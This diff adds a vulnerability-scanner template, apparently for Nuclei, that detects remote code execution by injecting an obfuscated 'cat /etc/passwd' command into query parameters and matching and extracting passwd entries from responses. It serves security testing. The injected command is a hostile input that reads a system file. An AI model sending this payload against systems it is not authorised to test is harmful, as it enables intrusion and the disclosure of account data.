@@ -1,0 +1,45 @@
+id: fuzz-rce-detection
+
+info:
+  name: Basic RCE Detection
+  author: netbaan
+  severity: high
+  description: |
+    This template is designed to detect remote code execution vulnerabilities using a payload that attempts to read the /etc/passwd file.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method in ["GET", "POST"]'  # Testing on both GET and POST requests
+
+    payloads:
+      rce_payload:
+        - "cat /etc/pa\\'ss\\'wd"
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query  # You can change this to 'body' if you want to test POST data
+        type: replace
+        mode: single
+        fuzz:
+          - "{{rce_payload}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "root:x:0:0:"
+
+      - type: status
+        status:
+          - 200
+          - 500  # Depending on the target, RCE might result in an error
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "([a-zA-Z0-9_-]+:x:[0-9]+:[0-9]+:.*:.*:.*)"
